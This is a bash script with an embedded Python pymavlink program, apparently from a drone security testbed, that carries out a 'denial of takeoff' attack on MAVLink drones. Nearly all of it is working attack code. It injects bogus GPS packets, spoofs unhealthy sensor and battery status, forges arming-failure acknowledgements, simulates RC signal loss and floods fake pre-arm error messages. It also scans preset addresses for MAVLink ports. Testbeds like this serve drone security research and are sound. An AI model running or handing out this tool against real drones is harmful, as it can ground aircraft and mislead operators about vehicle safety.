#!/bin/bash
# denial_of_takeoff_attack.sh - 드론 이륙 거부 공격
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/denial_of_takeoff_attack.sh
# Purpose: Pre-arm 검사 방해로 드론 이륙 방지 및 시스템 상태 조작

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Denial of Takeoff Attack"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}        Denial of Takeoff Attack          ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

execute_takeoff_denial() {
    local target_host=${1:-"127.0.0.1"}
    local target_port=${2:-"5760"}
    local denial_mode=${3:-"comprehensive"}
    local duration=${4:-120}
    
    log_info "Starting denial of takeoff attack"
    log_info "Target: ${target_host}:${target_port}"
    log_info "Denial mode: ${denial_mode}"
    log_info "Duration: ${duration} seconds"
    
    # Python 스크립트 생성 및 실행
    create_and_run_denial_attack "$target_host" "$target_port" "$denial_mode" "$duration"
    local result=$?
    
    if [ $result -eq 0 ]; then
        log_success "Denial of takeoff attack completed successfully"
        return 0
    else
        log_error "Denial of takeoff attack failed"
        return 1
    fi
}

create_and_run_denial_attack() {
    local target_host="$1"
    local target_port="$2"
    local denial_mode="$3"
    local duration="$4"
    
    log_info "Creating and executing takeoff denial attack..."
    
    python3 << PYEOF
from pymavlink import mavutil
import sys
import time
import threading
import signal

class TakeoffDenialAttacker:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.master = None
        self.attack_active = False
        self.attacks_executed = 0
        self.denial_events = 0
        
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        print(f"\\n[!] Attack interrupted. Attacks executed: {self.attacks_executed}, Denials: {self.denial_events}")
        self.stop_attack()
        sys.exit(0)
    
    def connect_to_drone(self):
        """드론에 연결"""
        try:
            connection_string = f'tcp:{self.target_ip}:{self.target_port}'
            print(f"[*] Connecting to {connection_string}...")
            
            self.master = mavutil.mavlink_connection(connection_string)
            
            # 하트비트 대기
            print("[*] Waiting for heartbeat...")
            msg = self.master.wait_heartbeat(timeout=10)
            
            if msg:
                print(f"[+] Connected to drone (System ID: {self.master.target_system})")
                return True
            else:
                print("[-] No heartbeat received")
                return False
                
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def check_prearm_status(self):
        """Pre-arm 상태 확인"""
        try:
            print("[*] Checking pre-arm status...")
            
            # 현재 시스템 상태 요청
            self.master.mav.heartbeat_request_send(
                self.master.target_system,
                self.master.target_component
            )
            
            # 시스템 상태 확인
            for _ in range(5):
                msg = self.master.recv_match(type=['HEARTBEAT', 'SYS_STATUS'], timeout=2)
                
                if msg:
                    if msg.get_type() == 'HEARTBEAT':
                        print(f"[+] System status: {msg.system_status}")
                        if msg.system_status == mavutil.mavlink.MAV_STATE_STANDBY:
                            print("[+] System in STANDBY - ready for arming")
                        elif msg.system_status == mavutil.mavlink.MAV_STATE_ACTIVE:
                            print("[!] System ACTIVE - already armed")
                        else:
                            print(f"[!] System status: {msg.system_status}")
                    
                    elif msg.get_type() == 'SYS_STATUS':
                        print(f"[+] Sensor health: 0x{msg.onboard_control_sensors_health:08x}")
                        if msg.onboard_control_sensors_health == 0xFFFFFFFF:
                            print("[+] All sensors healthy")
                        else:
                            print("[!] Some sensors unhealthy")
            
            return True
            
        except Exception as e:
            print(f"[-] Status check failed: {e}")
            return False
    
    def inject_gps_glitch(self):
        """GPS 신호 교란 주입"""
        print("[*] Starting GPS glitch injection...")
        
        while self.attack_active:
            try:
                # 잘못된 GPS 데이터 전송
                self.master.mav.gps_raw_int_send(
                    time_usec=int(time.time() * 1e6),
                    fix_type=1,  # No fix
                    lat=0,       # Invalid coordinates
                    lon=0,
                    alt=0,
                    eph=9999,    # Poor horizontal accuracy
                    epv=9999,    # Poor vertical accuracy
                    vel=0,
                    cog=0,
                    satellites_visible=0  # No satellites
                )
                
                self.attacks_executed += 1
                
                if self.attacks_executed % 20 == 0:
                    print(f"[*] GPS glitch: {self.attacks_executed} bad GPS packets sent")
                
                time.sleep(1)
                
            except Exception as e:
                print(f"[-] GPS glitch error: {e}")
                break
    
    def spoof_unhealthy_sensors(self):
        """센서 상태 스푸핑"""
        print("[*] Starting sensor health spoofing...")
        
        while self.attack_active:
            try:
                # 모든 센서 불량 상태로 보고
                self.master.mav.sys_status_send(
                    onboard_control_sensors_present=0xFFFFFFFF,  # All sensors present
                    onboard_control_sensors_enabled=0xFFFFFFFF,   # All enabled
                    onboard_control_sensors_health=0x00000000,    # All unhealthy
                    load=900,         # High CPU load
                    voltage_battery=3000,  # Low voltage
                    current_battery=5000,  # High current
                    battery_remaining=5,   # Low battery
                    drop_rate_comm=50,     # Communication drops
                    errors_comm=100,       # Communication errors
                    errors_count1=50,      # Sensor errors
                    errors_count2=50,
                    errors_count3=50,
                    errors_count4=50
                )
                
                self.attacks_executed += 1
                
                if self.attacks_executed % 15 == 0:
                    print(f"[*] Sensor spoof: {self.attacks_executed} unhealthy status sent")
                
                time.sleep(2)
                
            except Exception as e:
                print(f"[-] Sensor spoofing error: {e}")
                break
    
    def block_arming_commands(self):
        """무장 명령 차단"""
        print("[*] Starting arming command blocking...")
        
        while self.attack_active:
            try:
                # 무장 거부 응답 전송
                self.master.mav.command_ack_send(
                    command=mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                    result=mavutil.mavlink.MAV_RESULT_FAILED
                )
                
                self.attacks_executed += 1
                self.denial_events += 1
                
                if self.attacks_executed % 10 == 0:
                    print(f"[*] Arming block: {self.attacks_executed} denial responses sent")
                
                time.sleep(1.5)
                
            except Exception as e:
                print(f"[-] Arming block error: {e}")
                break
    
    def inject_safety_violations(self):
        """안전 위반 조건 주입"""
        print("[*] Starting safety violation injection...")
        
        while self.attack_active:
            try:
                # 배터리 위험 상태 시뮬레이션
                self.master.mav.battery_status_send(
                    id=0,
                    battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,
                    type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,
                    temperature=850,  # High temperature (85°C)
                    voltages=[3000, 3000, 3000, 3000],  # Low cell voltages
                    current_battery=10000,  # High current draw (100A)
                    current_consumed=50000,  # High consumption
                    energy_consumed=1000000,
                    battery_remaining=2  # Critical battery level
                )
                
                # RC 신호 손실 시뮬레이션
                self.master.mav.rc_channels_send(
                    time_boot_ms=int(time.time() * 1000) % 2**32,
                    chancount=8,
                    chan1_raw=0,    # No RC signal
                    chan2_raw=0,
                    chan3_raw=0,
                    chan4_raw=0,
                    chan5_raw=0,
                    chan6_raw=0,
                    chan7_raw=0,
                    chan8_raw=0,
                    chan9_raw=0,
                    chan10_raw=0,
                    chan11_raw=0,
                    chan12_raw=0,
                    chan13_raw=0,
                    chan14_raw=0,
                    chan15_raw=0,
                    chan16_raw=0,
                    chan17_raw=0,
                    chan18_raw=0,
                    rssi=0  # No signal strength
                )
                
                self.attacks_executed += 1
                
                if self.attacks_executed % 10 == 0:
                    print(f"[*] Safety violations: {self.attacks_executed} critical conditions sent")
                
                time.sleep(3)
                
            except Exception as e:
                print(f"[-] Safety violation error: {e}")
                break
    
    def send_fake_error_messages(self):
        """가짜 오류 메시지 전송"""
        print("[*] Starting fake error message injection...")
        
        error_messages = [
            "Pre-arm: GPS required",
            "Pre-arm: Sensor health check failed",
            "Pre-arm: Battery voltage too low",
            "Pre-arm: RC not calibrated",
            "Pre-arm: IMU not calibrated",
            "Pre-arm: Compass not calibrated",
            "Pre-arm: EKF attitude is bad",
            "Pre-arm: EKF velocity variance high",
            "Pre-arm: High GPS HDOP",
            "Pre-arm: Safety switch not pushed"
        ]
        
        message_index = 0
        
        while self.attack_active:
            try:
                current_message = error_messages[message_index % len(error_messages)]
                message_index += 1
                
                # 상태 텍스트 메시지로 오류 전송
                self.master.mav.statustext_send(
                    severity=mavutil.mavlink.MAV_SEVERITY_ERROR,
                    text=current_message.encode('utf-8')
                )
                
                self.attacks_executed += 1
                
                if self.attacks_executed % 5 == 0:
                    print(f"[*] Error messages: {self.attacks_executed} fake errors sent")
                    print(f"    Last message: {current_message}")
                
                time.sleep(4)
                
            except Exception as e:
                print(f"[-] Error message injection failed: {e}")
                break
    
    def test_arming_attempt(self):
        """무장 시도 테스트"""
        print("[*] Testing arming attempt...")
        
        try:
            # 무장 명령 전송
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                0,  # confirmation
                1,  # param1: 1 = arm
                0, 0, 0, 0, 0, 0
            )
            
            print("[+] Arming command sent, waiting for response...")
            
            # 응답 대기
            start_time = time.time()
            while (time.time() - start_time) < 10:
                msg = self.master.recv_match(type='COMMAND_ACK', timeout=2)
                
                if msg and msg.command == mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM:
                    if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                        print("[!] Arming ACCEPTED - Denial attack failed")
                        return False
                    else:
                        print(f"[+] Arming DENIED (result: {msg.result}) - Attack successful")
                        self.denial_events += 1
                        return True
            
            print("[-] No arming response received")
            return False
            
        except Exception as e:
            print(f"[-] Arming test failed: {e}")
            return False
    
    def monitor_prearm_events(self, duration=60):
        """Pre-arm 이벤트 모니터링"""
        print(f"[*] Monitoring pre-arm events for {duration} seconds...")
        
        start_time = time.time()
        prearm_events = []
        
        while (time.time() - start_time) < duration:
            try:
                msg = self.master.recv_match(type=['STATUSTEXT', 'COMMAND_ACK'], timeout=2)
                
                if msg:
                    if msg.get_type() == 'STATUSTEXT':
                        text = msg.text.decode('utf-8', errors='ignore')
                        if any(keyword in text.lower() for keyword in ['pre-arm', 'prearm', 'arm', 'safety']):
                            prearm_events.append(f"[{time.time():.1f}] {text}")
                            print(f"[*] Pre-arm event: {text}")
                    
                    elif msg.get_type() == 'COMMAND_ACK':
                        if msg.command == mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM:
                            result_name = "ACCEPTED" if msg.result == 0 else f"FAILED({msg.result})"
                            prearm_events.append(f"[{time.time():.1f}] Arming: {result_name}")
                            print(f"[*] Arming result: {result_name}")
                
            except Exception as e:
                print(f"[-] Monitoring error: {e}")
                break
        
        print(f"[+] Monitoring completed: {len(prearm_events)} events captured")
        return prearm_events
    
    def comprehensive_denial_attack(self, duration):
        """종합적인 이륙 거부 공격"""
        print(f"[*] Starting comprehensive takeoff denial for {duration} seconds...")
        
        self.attack_active = True
        
        # 다중 공격 스레드 시작
        attack_threads = []
        
        attack_methods = [
            ("GPS Glitch", self.inject_gps_glitch),
            ("Sensor Spoofing", self.spoof_unhealthy_sensors),
            ("Arming Block", self.block_arming_commands),
            ("Safety Violations", self.inject_safety_violations),
            ("Error Messages", self.send_fake_error_messages)
        ]
        
        for method_name, method_func in attack_methods:
            thread = threading.Thread(target=method_func, name=method_name)
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
            print(f"[+] Started {method_name} attack thread")
            time.sleep(1)
        
        # 공격 지속
        time.sleep(duration)
        
        # 공격 중지
        self.stop_attack()
        
        print(f"[+] Comprehensive attack completed")
        print(f"    Total attacks executed: {self.attacks_executed}")
        print(f"    Denial events generated: {self.denial_events}")
        
        return True
    
    def stop_attack(self):
        """공격 중지"""
        print("[*] Stopping takeoff denial attack...")
        self.attack_active = False

# 메인 실행 로직
target_ip = "$target_host"
target_port = int("$target_port")
denial_mode = "$denial_mode"
duration = int("$duration")

attacker = TakeoffDenialAttacker(target_ip, target_port)

try:
    print(f"[*] Starting denial of takeoff attack on {target_ip}:{target_port}")
    print(f"[*] Mode: {denial_mode}, Duration: {duration} seconds")
    print(f"[*] Press Ctrl+C to stop attack")
    print("")
    
    if not attacker.connect_to_drone():
        print("[-] Failed to connect to drone")
        sys.exit(1)
    
    # Pre-arm 상태 확인
    attacker.check_prearm_status()
    
    if denial_mode == "gps_glitch":
        attacker.attack_active = True
        attacker.inject_gps_glitch()
    elif denial_mode == "sensor_spoof":
        attacker.attack_active = True
        attacker.spoof_unhealthy_sensors()
    elif denial_mode == "arming_block":
        attacker.attack_active = True
        attacker.block_arming_commands()
    elif denial_mode == "safety_violations":
        attacker.attack_active = True
        attacker.inject_safety_violations()
    elif denial_mode == "test_arming":
        success = attacker.test_arming_attempt()
        print(f"[*] Arming test result: {'DENIED' if success else 'ALLOWED'}")
    elif denial_mode == "monitor":
        events = attacker.monitor_prearm_events(duration)
        print(f"[+] Captured {len(events)} pre-arm events")
    elif denial_mode == "comprehensive":
        attacker.comprehensive_denial_attack(duration)
    else:
        print(f"[-] Unknown denial mode: {denial_mode}")
        sys.exit(1)
    
    attacker.stop_attack()
    
    print(f"\\n[+] Denial of takeoff attack completed successfully")
    print(f"[+] Total attacks executed: {attacker.attacks_executed}")
    print(f"[+] Denial events: {attacker.denial_events}")
    sys.exit(0)
    
except Exception as e:
    print(f"[-] Attack execution failed: {e}")
    attacker.stop_attack()
    sys.exit(1)
PYEOF
    
    return $?
}

# MAVLink 타겟 스캔
scan_mavlink_targets() {
    log_info "Scanning for MAVLink targets..."
    
    local common_targets=(
        "127.0.0.1:5760"
        "127.0.0.1:14550"
        "10.13.0.3:5760"
        "10.13.0.4:14550"
        "192.168.13.1:5760"
        "192.168.1.100:5760"
    )
    
    local found_targets=()
    
    for target in "${common_targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 3 nc -z "$ip" "$port" 2>/dev/null; then
            found_targets+=("$target")
            echo -e "${GREEN}Found MAVLink service: $target${NC}"
        fi
    done
    
    if [ ${#found_targets[@]} -eq 0 ]; then
        echo -e "${YELLOW}No live MAVLink targets found, using simulation mode${NC}"
        return 1
    fi
    
    return 0
}

# 메인 실행 함수
main() {
    print_attack_banner
    
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # 필수 도구 확인
    local required_tools=("python3")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        exit 1
    fi
    
    # Python 의존성 확인
    if ! python3 -c "import pymavlink" 2>/dev/null; then
        log_info "Installing Python dependencies..."
        pip3 install pymavlink >/dev/null 2>&1
    fi
    
    # 사용자 옵션 처리
    local target_host="${1:-127.0.0.1}"
    local target_port="${2:-5760}"
    local denial_mode="${3:-comprehensive}"
    local duration="${4:-120}"
    
    # 사용법 출력
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "Usage: $0 [target_host] [target_port] [denial_mode] [duration]"
        echo "  target_host : Target IP address (default: 127.0.0.1)"
        echo "  target_port : Target MAVLink port (default: 5760)"
        echo "  denial_mode : Denial strategy (default: comprehensive)"
        echo "  duration    : Attack duration in seconds (default: 120)"
        echo ""
        echo "Denial modes:"
        echo "  gps_glitch      : GPS signal corruption"
        echo "  sensor_spoof    : Sensor health spoofing"
        echo "  arming_block    : Arming command blocking"
        echo "  safety_violations: Safety condition violations"
        echo "  test_arming     : Test arming capability"
        echo "  monitor         : Monitor pre-arm events"
        echo "  comprehensive   : All denial methods combined"
        echo ""
        echo "Examples:"
        echo "  $0                                    # Comprehensive denial"
        echo "  $0 10.13.0.3 5760 gps_glitch 60     # GPS glitch for 60s"
        echo "  $0 127.0.0.1 5760 sensor_spoof 90   # Sensor spoofing for 90s"
        echo "  $0 127.0.0.1 5760 test_arming       # Test arming capability"
        echo "  $0 127.0.0.1 5760 monitor 30        # Monitor for 30s"
        echo ""
        echo "Target examples:"
        echo "  10.13.0.3:5760   - Companion Computer"
        echo "  127.0.0.1:5760   - Local SITL"
        echo "  127.0.0.1:14550  - QGroundControl"
        exit 0
    fi
    
    # 타겟 스캔 (정보용)
    scan_mavlink_targets
    
    # 공격 실행
    execute_takeoff_denial "$target_host" "$target_port" "$denial_mode" "$duration"
    exit $?
}

# 직접 실행 시 메인 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi